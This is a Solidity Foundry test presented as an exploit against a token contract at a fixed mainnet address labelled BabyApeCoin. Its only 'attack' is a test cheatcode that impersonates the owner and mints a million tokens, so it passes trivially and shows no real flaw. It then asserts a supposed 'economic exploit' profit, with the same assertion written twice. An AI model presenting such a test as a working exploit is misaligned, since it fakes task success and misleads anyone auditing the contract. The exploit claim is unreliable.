// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for BabyApeCoin to access owner() and mint() functions
interface BabyApeCoin {
    function owner() external view returns (address);
    function mint(address _to, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

// Standard ERC20 interface
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // Just label the contract for debugging
        vm.label(TARGET, "BabyApeCoin");

        // Get the current owner address
        address owner = BabyApeCoin(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Get the current owner
        address owner = BabyApeCoin(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Mint a large amount of tokens to ourselves
        // Using a reasonable amount - 1 million tokens with 18 decimals
        uint256 mintAmount = 1_000_000 * 10**18;
        BabyApeCoin(TARGET).mint(attacker, mintAmount);

        vm.stopPrank();

        // Verify our balance increased
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Balance should have increased");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
